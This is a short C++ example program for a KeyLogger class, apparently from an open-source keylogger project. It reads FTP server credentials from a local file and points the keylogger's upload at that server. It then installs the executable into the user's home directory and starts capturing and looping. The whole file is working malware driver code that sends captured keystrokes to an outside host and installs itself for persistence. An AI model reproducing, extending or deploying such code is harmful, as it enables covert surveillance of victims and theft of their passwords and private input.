/*
Example standalone program using the KeyLogger class
*/

#include "keylogger.h"

using namespace std;

//int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
int main()
{
    KeyLogger* kl = KeyLogger::getInstance();
    
    //get our FTP credentials
    ifstream ftpCredentials;
    ftpCredentials.open("ftp.txt");
    std::string server, login, pass;
    ftpCredentials >> server >> login >> pass;
    ftpCredentials.close();
    
    //enable FTP upload
    kl->setMaster(server, 21, login, pass);

    kl->install(kl->getUserHomeDirectory() + "OpenKeyLogger.exe");

    kl->listen();
 
    kl->loop();

    return 0;
}